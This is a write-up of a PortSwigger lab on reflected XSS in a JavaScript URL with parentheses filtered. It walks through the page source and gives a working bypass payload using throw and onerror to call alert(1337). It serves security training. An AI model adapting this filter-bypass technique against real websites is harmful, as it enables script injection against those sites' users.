# Reflected XSS in a JavaScript URL with some characters blocked

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked), you'll learn: Reflected XSS in a JavaScript URL with some characters blocked! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent [XSS](https://portswigger.net/web-security/cross-site-scripting) attacks.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101061902.png)

In the home page, we can view one of those posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101062226.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101062242.png)

**View source page:**
```html
<div class="is-linkback">
    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

In the `Back to Blog` `<a>` tag link, **it's using a JavaScript code, which sends a POST request to `/analytics` with parameter `/post?postId=2`.**

**Let's try to inject JavaScript code in `/post?postId=2` GET parameter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101063040.png)

Hmm... Looks like we first need to bypass the `Invalid blog post ID`.

**To do so, I'll try to close the JavaScript URL via `'`, with HTML encoding:**
```
&%27;
```

**Let's try to inject a XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101065321.png)

However, the parentheses (`()`) are missing. Looks like the application removes them.

**To bypass that, we can:**
```js
2&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**Result:**
```js
javascript:fetch('/analytics', {method:'post',body:'/post/postId=2'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

In here, we can use `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses.

The `{throw/**/onerror=alert,1337}` code is to throw an exception, which is a JavaScript comment and it'll trigger an error. Then, when an error occurred, assign function `alert()`, with argument `1337` to `onerror` exception handler.

Finally, the `,toString=x,window+'',{x:'` code is to assign the `toString` property of `window` and trigger this by forcing a string conversion on `window`.

Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-26/images/Pasted%20image%2020230101065708.png)

When we click the `Back to Blog` link, it'll trigger an alert box!

# What we've learned:

1. Reflected XSS in a JavaScript URL with some characters blocked